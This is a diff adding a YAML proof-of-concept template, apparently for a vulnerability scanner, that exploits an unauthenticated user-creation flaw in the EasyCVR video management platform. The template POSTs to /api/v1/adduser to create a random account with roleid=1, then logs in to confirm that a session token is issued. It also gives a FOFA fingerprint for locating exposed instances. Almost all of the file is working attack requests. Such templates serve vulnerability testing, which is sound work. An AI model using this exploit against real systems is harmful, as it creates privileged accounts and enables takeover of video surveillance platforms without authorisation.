@@ -1,0 +1,23 @@
+id: poc-yaml-easy-cvr-adduser-any-user-add
+info:
+  name: EasyCVR视频管理平台 adduser 任意用户添加漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: EasyCVR
+  fofa: body="EasyCVR"
+variables:
+  user: random_str(5)
+  password: md5(random_str(8))
+requests:
+- method: POST
+  path: /api/v1/adduser
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name={{.user}}&username={{.user}}&password={{.password}}&roleid=1
+  expression: status_code == 200 && contains(body,"success")
+- method: GET
+  path: /api/v1/login?_t=1716345889&username={{.user}}&password={{.password}}
+  expression: status_code == 200 && contains(body,"Success OK") && contains(body,"Token")
+    && contains(body,user)
+transport: http
